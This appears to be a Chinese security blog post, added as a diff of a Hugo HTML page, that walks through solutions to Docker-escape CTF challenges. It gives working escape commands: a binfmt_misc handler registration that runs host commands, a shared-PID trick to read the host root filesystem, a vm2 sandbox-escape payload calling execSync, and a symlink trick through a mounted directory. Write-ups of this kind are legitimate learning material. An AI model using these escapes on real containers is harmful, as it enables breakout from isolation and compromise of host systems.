@@ -1,0 +1,582 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    
+    <meta property="og:site_name" content="Muscial Blog">
+    <meta property="og:type" content="article">
+
+    
+    <meta property="og:image" content="https://muscial.github.io/img/bizhi.jpg">
+    <meta property="twitter:image" content="https://muscial.github.io/img/bizhi.jpg" />
+    
+
+    
+    <meta name="title" content="有关docker逃逸的题目复现" />
+    <meta property="og:title" content="有关docker逃逸的题目复现" />
+    <meta property="twitter:title" content="有关docker逃逸的题目复现" />
+    
+
+    
+    <meta name="description" content="Muscial">
+    <meta property="og:description" content="Muscial" />
+    <meta property="twitter:description" content="Muscial" />
+    
+
+    
+    <meta property="twitter:card" content="summary" />
+    
+    
+
+    <meta name="keyword"  content="Muscial">
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>有关docker逃逸的题目复现 | Muscial的博客 | 保持冷静，奋不顾身</title>
+
+    <link rel="canonical" href="/post/%E6%9C%89%E5%85%B3%E9%80%83%E9%80%B8%E7%9A%84%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/">
+
+    
+    
+    
+    <link rel="stylesheet" href="/css/bootstrap.min.css">
+
+    
+    <link rel="stylesheet" href="/css/hugo-theme-cleanwhite.min.css">
+
+    
+    <link rel="stylesheet" href="/css/zanshang.css">
+
+    
+    <link href="https://cdn.jsdelivr.net/gh/FortAwesome/Font-Awesome@5.15.1/css/all.css" rel="stylesheet" type="text/css">
+
+    
+    
+
+    
+    <script src="/js/jquery.min.js"></script>
+
+    
+    <script src="/js/bootstrap.min.js"></script>
+
+    
+    <script src="/js/hux-blog.min.js"></script>
+
+    
+    <script src="/js/lazysizes.min.js"></script>
+
+    
+    
+
+</head>
+
+
+
+
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+
+    <div class="container-fluid">
+        
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">Muscial Blog</a>
+        </div>
+
+        
+        
+        <div id="huxblog_navbar">
+            <div class="navbar-collapse">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="/">All Posts</a>
+                    </li>
+                    
+                        
+                        <li>
+                            <a href="/categories/tech">tech</a>
+                        </li>
+                        
+                    
+                    
+		    
+                        <li><a href="/archive/">ARCHIVE</a></li>
+                    
+                        <li><a href="/notes/">NOTES</a></li>
+                    
+                        <li><a href="/about/">ABOUT</a></li>
+                    
+
+                    
+		    <li>
+                        <a href="/search"><i class="fa fa-search"></i></a>
+		    </li>
+                    
+                </ul>
+            </div>
+        </div>
+        
+    </div>
+    
+</nav>
+<script>
+    
+    
+    
+    var $body   = document.body;
+    var $toggle = document.querySelector('.navbar-toggle');
+    var $navbar = document.querySelector('#huxblog_navbar');
+    var $collapse = document.querySelector('.navbar-collapse');
+
+    $toggle.addEventListener('click', handleMagic)
+    function handleMagic(e){
+        if ($navbar.className.indexOf('in') > 0) {
+        
+            $navbar.className = " ";
+            
+            setTimeout(function(){
+                
+                if($navbar.className.indexOf('in') < 0) {
+                    $collapse.style.height = "0px"
+                }
+            },400)
+        }else{
+        
+            $collapse.style.height = "auto"
+            $navbar.className += " in";
+        }
+    }
+</script>
+
+
+
+
+<style type="text/css">
+    header.intro-header {
+        background-image: url('/img/bizhi.jpg')
+    }
+</style>
+
+<header class="intro-header" >
+
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <div class="post-heading">
+                    <div class="tags">
+                        
+                    </div>
+                    <h1>有关docker逃逸的题目复现</h1>
+                    <h2 class="subheading">Cloud Security</h2>
+                    <span class="meta">
+                        
+                            Posted by 
+                            
+                                Muscial
+                             
+                            on 
+                            Monday, February 12, 2024
+                            
+                            
+                            
+                            
+                    </span>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+
+
+
+<article>
+    <div class="container">
+        <div class="row">
+
+            
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                post-container">
+
+                
+                <h1 id="有关docker逃逸的题目复现">有关docker逃逸的题目复现</h1>
+<h1 id="前言">前言</h1>
+<p>感谢swing师傅的rwctf环境支持</p>
+<p>环境：</p>
+<p><a href="https://github.com/WinMin/Be-a-Docker-Escaper/tree/main/Be-a-Docker-Escaper">https://github.com/WinMin/Be-a-Docker-Escaper/tree/main/Be-a-Docker-Escaper</a></p>
+<p>ebpf那道放一下，回头再来看吧</p>
+<h1 id="be-a-docker-escaper">Be-a-docker-Escaper</h1>
+<p>挂载socket ，环境还没有</p>
+<h1 id="be-a-docker-escaper2">Be-a-docker-Escaper2</h1>
+<p>环境有点大，vps搭的时候还搭不起（2c2g</p>
+<p>换了windows docker搭建，内存占了8g差点爆了</p>
+<p>吐槽一下ssh连接</p>
+<p>本来环境是windows：5555-容器：5555-容器的云环境：22</p>
+<p>也就是容器的云环境开了22端口，映射到容器的5555端口，但我windows再映射容器的5555端口时候，却发现怎么都连不起，只有进容器，apt下一个ssh，再连接5555端口，才进了云环境</p>
+<h2 id="复现">复现</h2>
+<p>先ps -aux看一下，启动命令没有脏东西</p>
+<p>根目录有/binfmt_misc 这个不寻常的文件夹，就是解题的关键</p>
+<p>网上也可以搜到关于/binfmt_misc逃逸的文章</p>
+<p><a href="http://paper.vulsee.com/KCon/2021/Container%20escape%20in%202021.pdf">http://paper.vulsee.com/KCon/2021/Container%20escape%20in%202021.pdf</a></p>
+<p><a href="https://www.cnblogs.com/yaohong/p/17481358.html">https://www.cnblogs.com/yaohong/p/17481358.html</a></p>
+<p>看了binfmt_misc,他的作用主要是注册解释器，然后跨平台执行文件（mips,arm）</p>
+<p>注册使用，通常要把/proc/sys/fs/binfmt_misc ，挂载到/binfmt_misc</p>
+<p>但是这里直接挂在了云环境的/binfmt_misc上面</p>
+<p>binfmt注册格式为</p>
+<p>:name:type:offset:magic:mask:interpreter:flags</p>
+<ul>
+<li><code>name：</code><em>是一个标识符字符串。指定解析器的名称或标识。在这个例子中，解析器的名称为&quot;arm&quot;；</em></li>
+<li><code>type：</code><em>是识别类型。给予<code>M</code>魔法和<code>E</code>扩展。</em></li>
+<li><code>offset：</code><em>是文件中 magic/mask 的偏移量，以字节计算。默认为 0 <code>:name:type::magic...</code>。使用文件扩展名匹配时忽略。</em></li>
+<li><code>magic：</code><em>是 binfmt_misc 匹配的字节序列。魔术字符串可能包含十六进制编码的字符，</em></li>
+<li><code>mask：</code><em>是一个（可选，默认为所有 0xff）掩码。</em></li>
+<li><code>interpreter：</code><em>是应该使用二进制文件作为第一个参数调用的程序（指定完整路径）</em></li>
+<li><code>flags：</code><em>这些标志控制解析器的行为和操作方式。下面是一些常见的 flags 标志及其作用：</em></li>
+</ul>
+<p>注册了的binfmt解释器通过：内核通过魔术数字（Magic Nmuber）来识别特定的二进制文件格式。</p>
+<p>这里只需要找到host执行什么类型的脚本，然后找到对应的magic number就行了</p>
+<p>这里不知道为啥看不到任何进程，出题人的wp上应该有sshd的进程，总之执行sh文件就是了</p>
+<p>magic number匹配过程</p>
+<ol>
+<li>内核读取二进制文件的开头部分的字节序列，通常是文件的前几个字节。</li>
+<li>内核将读取到的字节序列与已注册解释器的魔术数字进行比对。</li>
+<li>如果找到与魔术数字匹配的解释器，则选择该解释器来处理该二进制文件。</li>
+<li>如果没有找到匹配的解释器，内核将无法执行该二进制文件，并可能会返回错误。</li>
+</ol>
+<p>所以magic number是#!/bin/sh 的字节序列（16进制</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#bd93f9">0x23</span>, <span style="color:#bd93f9">0x21</span>, <span style="color:#bd93f9">0x2F</span>, <span style="color:#bd93f9">0x62</span>, <span style="color:#bd93f9">0x69</span>, <span style="color:#bd93f9">0x6E</span>, <span style="color:#bd93f9">0x2F</span>, <span style="color:#bd93f9">0x73</span>, <span style="color:#bd93f9">0x68</span>
+</span></span><span style="display:flex;"><span>\x23\x21\x2f\x62\x69\x6e\x2f\x73\x68
+</span></span></code></pre></div><p>注册binfmt</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>echo <span style="color:#f1fa8c">&#34;:register:M::\x23\x21\x2f\x62\x69\x6e\x2f\x73\x68::/var/lib/docker/overlay2/736f6343cf3ca9fefaf9079b1ad7f706cafa0877fedbc813606faca70e5000c5/diff/tmp/exploit:&#34;</span> <span style="color:#ff79c6">&gt;</span> /binfmt_misc/register
+</span></span></code></pre></div><p>interpreter位于 <code>/var/lib/docker/overlay2/$overlay/diff/tmp/exploit</code> 的 binfmt ，其中 <code>overlay2</code> 我们可以在 docker 中使用 mount 命令来获取</p>
+<ol>
+<li>往 <code>/var/lib/docker/overlay2/$overlay/diff/tmp/exploit</code> 写入我们要执行的命令</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>echo <span style="color:#f1fa8c">&#39;#!/bin/bash&#39;</span> <span style="color:#ff79c6">&gt;</span> /tmp/exploit
+</span></span><span style="display:flex;"><span>echo <span style="color:#f1fa8c">&#34;docker cp /root/flag $container:/tmp/&#34;</span> <span style="color:#ff79c6">&gt;&gt;</span> /tmp/exploit
+</span></span><span style="display:flex;"><span>chmod <span style="color:#bd93f9">777</span> <span style="color:#ff79c6">/</span>tmp<span style="color:#ff79c6">/</span>exploit
+</span></span></code></pre></div><p>这里注意一下，原来的shell写sh脚本，打包出来flag，新建一个ssh的shell运行这个脚本，flag会在原来的shell上面。</p>
+<p>
+  <img src="https://raw.githubusercontent.com/Muscial/muscial.github.io/master/img/blog_images/docker%E5%A4%8D%E7%8E%B0/1.png" alt="Untitled">
+
+</p>
+<h1 id="be-a-docker-escaper-4">Be-a-Docker-Escaper-4</h1>
+<p>环境好像有问题，docker搭不起一直，我记得这道题好像上的时候就有问题。。。</p>
+<p>不过好在题目不是很难</p>
+<h2 id="虚空复现">虚空复现</h2>
+<p><code>ps -aux</code> 命令能看到这个容器的启动命令：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#bd93f9">1000</span>        <span style="color:#bd93f9">1113</span>  <span style="color:#bd93f9">0.0</span>  <span style="color:#bd93f9">0.0</span>   <span style="color:#bd93f9">6188</span>   <span style="color:#bd93f9">992</span> pts<span style="color:#ff79c6">/</span><span style="color:#bd93f9">0</span>    S<span style="color:#ff79c6">+</span>   <span style="color:#bd93f9">06</span><span style="color:#ff79c6">:</span><span style="color:#bd93f9">25</span>   <span style="color:#bd93f9">0</span><span style="color:#ff79c6">:</span><span style="color:#bd93f9">00</span> sleep <span style="color:#bd93f9">10000</span>
+</span></span><span style="display:flex;"><span><span style="color:#bd93f9">1000</span>        <span style="color:#bd93f9">1114</span>  <span style="color:#bd93f9">0.0</span>  <span style="color:#bd93f9">2.3</span> <span style="color:#bd93f9">1180376</span> <span style="color:#bd93f9">23264</span> pts<span style="color:#ff79c6">/</span><span style="color:#bd93f9">0</span>   Sl<span style="color:#ff79c6">+</span>  <span style="color:#bd93f9">06</span><span style="color:#ff79c6">:</span><span style="color:#bd93f9">25</span>   <span style="color:#bd93f9">0</span><span style="color:#ff79c6">:</span><span style="color:#bd93f9">00</span> docker run <span style="color:#ff79c6">--</span>rm <span style="color:#ff79c6">-</span>it <span style="color:#ff79c6">--</span>pid<span style="color:#ff79c6">=</span>host <span style="color:#ff79c6">--</span>security<span style="color:#ff79c6">-</span>opt<span style="color:#ff79c6">=</span>apparmor<span style="color:#ff79c6">=</span>unconfined ubuntu bash
+</span></span></code></pre></div><p>共享pid逃逸</p>
+<p><a href="https://www.anquanke.com/post/id/290540">https://www.anquanke.com/post/id/290540</a></p>
+<blockquote>
+<p><strong>利用思路</strong></p>
+<p>从上面的研究中，我们可以总结出一个容器逃逸的新思路。</p>
+<p>根据上面的研究，这种情况下容器访问不了宿主机上以非 root 用户运行的进程的 rootfs 的原因是，容器进程的 fsuid、fsgid 分别与目标进程的 euid、suid、uid 和 egid、sgid、gid 不匹配。那么怎么才能让它们匹配呢？其实很简单，找到宿主机上以非 root 用户运行的进程后，我们在容器中创建一个 UID 和 GID 与目标进程 UID 和 GID 相同的用户，然后用 su 命令切换到该用户，就有权限访问目标进程的 <code>/proc/[pid]/root</code> 了。当然需要注意目标进程必须是 dumpable 的。</p>
+</blockquote>
+<p>exp</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#6272a4">#!/bin/sh
+</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
+</span></span><span style="display:flex;"><span>pid<span style="color:#ff79c6">=</span>$(pidof sleep)
+</span></span><span style="display:flex;"><span>useradd <span style="color:#ff79c6">-</span>u <span style="color:#bd93f9">1000</span> user
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>su user <span style="color:#ff79c6">-</span>c <span style="color:#f1fa8c">&#34;cat /proc/$pid/root/flag1&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>创建一个 uid 为 <span style="color:#bd93f9">1000</span> 的用户， 然后通过读 sleep 进程下的 <span style="color:#ff79c6">/</span>proc<span style="color:#ff79c6">/</span>$PID<span style="color:#ff79c6">/</span>root 的文件就能读到 flag
+</span></span></code></pre></div><h1 id="escape-web">escape-web</h1>
+<p>前面是nodejs的vm2逃逸</p>
+<p><a href="https://gist.github.com/leesh3288/e4aa7b90417b0b0ac7bcd5b09ac7d3bd">https://gist.github.com/leesh3288/e4aa7b90417b0b0ac7bcd5b09ac7d3bd</a></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#ff79c6">const</span> {VM} <span style="color:#ff79c6">=</span> require(<span style="color:#f1fa8c">&#34;vm2&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">const</span> vm <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> VM();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">const</span> code <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">`
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">const customInspectSymbol = Symbol.for(&#39;nodejs.util.inspect.custom&#39;);
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">obj = {
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">    [customInspectSymbol]: (depth, opt, inspect) =&gt; {
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">        inspect.constructor(&#39;return process&#39;)().mainModule.require(&#39;child_process&#39;).execSync(&#39;touch pwned&#39;);
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">    },
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">    valueOf: undefined,
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">    constructor: undefined,
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">}
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">WebAssembly.compileStreaming(obj).catch(()=&gt;{});
+</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c">`</span>;
+</span></span></code></pre></div><p>当时机子不出网，一直想反弹shell了，常规docker逃逸也试完了，现在一想肯定是挂载了目录</p>
+<p>mount 可以看host把文件挂载了什么地方</p>
+<p>
+  <img src="https://raw.githubusercontent.com/Muscial/muscial.github.io/master/img/blog_images/docker%E5%A4%8D%E7%8E%B0/2.png" alt="Untitled">
+
+</p>
+<p>这里是挂载了/app</p>
+<p>ln -s /flag /app/output.txt 直接使用软连接把flag导向/app/output.txt即可</p>
+<h1 id="escape2-misc">escape2-misc</h1>
+<p>问了下大佬，是ebpf逃逸，环境还没有，主要讲下思路</p>
+<p><a href="https://drivertom.blogspot.com/2022/01/ebpfdocker.html">https://drivertom.blogspot.com/2022/01/ebpfdocker.html</a></p>
+<p><a href="https://paper.seebug.org/1750/">https://paper.seebug.org/1750/</a></p>
+<p>题目cap码给了cap_sys_admin+debugfs</p>
+<p>ebpf hook 系统调用了</p>
+<p>不太会，也看不懂很多，后面熟悉docker后回头来看吧</p>
+
+
+                
+
+                
+                <hr>
+                <ul class="pager">
+                    
+                    <li class="previous">
+                        <a href="/post/docker%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8%E5%85%A5%E9%97%A8/" data-toggle="tooltip" data-placement="top" title="Docker容器逃逸入门">&larr;
+                            Previous Post</a>
+                    </li>
+                    
+                    
+                </ul>
+                
+
+                
+
+
+
+            </div>
+
+            
+            
+            <div class="
+                col-lg-2 col-lg-offset-0
+                visible-lg-block
+                sidebar-container
+                catalog-container">
+                <div class="side-catalog">
+                    <hr class="hidden-sm hidden-xs">
+                    <h5>
+                        <a class="catalog-toggle" href="#">CATALOG</a>
+                    </h5>
+                    <ul class="catalog-body"></ul>
+                </div>
+            </div>
+            
+
+            
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+                
+                
+                <section>
+                    <hr class="hidden-sm hidden-xs">
+                    <h5><a href="/tags/">FEATURED TAGS</a></h5>
+                    <div class="tags">
+                        
+                        
+                        
+                        
+                        
+                        
+                    </div>
+                </section>
+                
+
+                
+                
+                <section>
+                    <hr>
+                    <h5>FRIENDS</h5>
+                    <ul class="list-inline">
+                        
+                        <li><a target="_blank" href="https://3cly.github.io/link/">3cly的博客</a></li>
+                        
+                    </ul>
+                </section>
+                
+            </div>
+        </div>
+    </div>
+</article>
+
+
+
+
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <ul class="list-inline text-center">                  
+                    
+                    <li>
+                        <a href="mailto:muscial@outlook.jp">
+                            <span class="fa-stack fa-lg">
+                                <i class="fas fa-circle fa-stack-2x"></i>
+                                <i class="fas fa-envelope fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+		           
+                    
+                    
+                    
+                    
+
+		            
+                    
+                    
+                    <li>
+                        <a target="_blank" href="https://github.com/Muscial">
+                            <span class="fa-stack fa-lg">
+                                <i class="fas fa-circle fa-stack-2x"></i>
+                                <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+		            
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+            
+            
+            
+           
+             </ul>
+		<p class="copyright text-muted">
+                    Copyright &copy; Muscial Blog 2024
+                    <br>
+                    <a href="https://themes.gohugo.io/hugo-theme-cleanwhite">CleanWhite Hugo Theme</a> by <a href="https://zhaohuabing.com">Huabing</a> |
+                    <iframe
+                        style="margin-left: 2px; margin-bottom:-5px;"
+                        frameborder="0" scrolling="0" width="100px" height="20px"
+                        src="https://ghbtns.com/github-btn.html?user=zhaohuabing&repo=hugo-theme-cleanwhite&type=star&count=true" >
+                    </iframe>
+                </p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+
+
+
+<script>
+    function loadAsync(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+
+
+
+
+
+<script>
+    
+    if($('#tag_cloud').length !== 0){
+        loadAsync("/js/jquery.tagcloud.js",function(){
+            $.fn.tagcloud.defaults = {
+                
+                color: {start: '#bbbbee', end: '#0085a1'},
+            };
+            $('#tag_cloud a').tagcloud();
+        })
+    }
+</script>
+
+
+<script>
+    loadAsync("https://cdn.jsdelivr.net/npm/fastclick@1.0.6/lib/fastclick.min.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+
+
+
+
+
+
+
+
+<script type="text/javascript">
+    function generateCatalog(selector) {
+
+        
+        
+        
+        
+            _containerSelector = 'div.post-container'
+        
+
+        
+        var P = $(_containerSelector), a, n, t, l, i, c;
+        a = P.find('h1,h2,h3,h4,h5,h6');
+
+        
+        $(selector).html('')
+
+        
+        a.each(function () {
+            n = $(this).prop('tagName').toLowerCase();
+            i = "#" + $(this).prop('id');
+            t = $(this).text();
+            c = $('<a href="' + i + '" rel="nofollow">' + t + '</a>');
+            l = $('<li class="' + n + '_nav"></li>').append(c);
+            $(selector).append(l);
+        });
+        return true;
+    }
+
+    generateCatalog(".catalog-body");
+
+    
+    $(".catalog-toggle").click((function (e) {
+        e.preventDefault();
+        $('.side-catalog').toggleClass("fold")
+    }))
+
+    
+
+
+    loadAsync("\/js\/jquery.nav.js", function () {
+        $('.catalog-body').onePageNav({
+            currentClass: "active",
+            changeHash: !1,
+            easing: "swing",
+            filter: "",
+            scrollSpeed: 700,
+            scrollOffset: 0,
+            scrollThreshold: .2,
+            begin: null,
+            end: null,
+            scrollChange: null,
+            padding: 80
+        });
+    });
+</script>
+
+
+
+
+
+
+</body>
+</html>
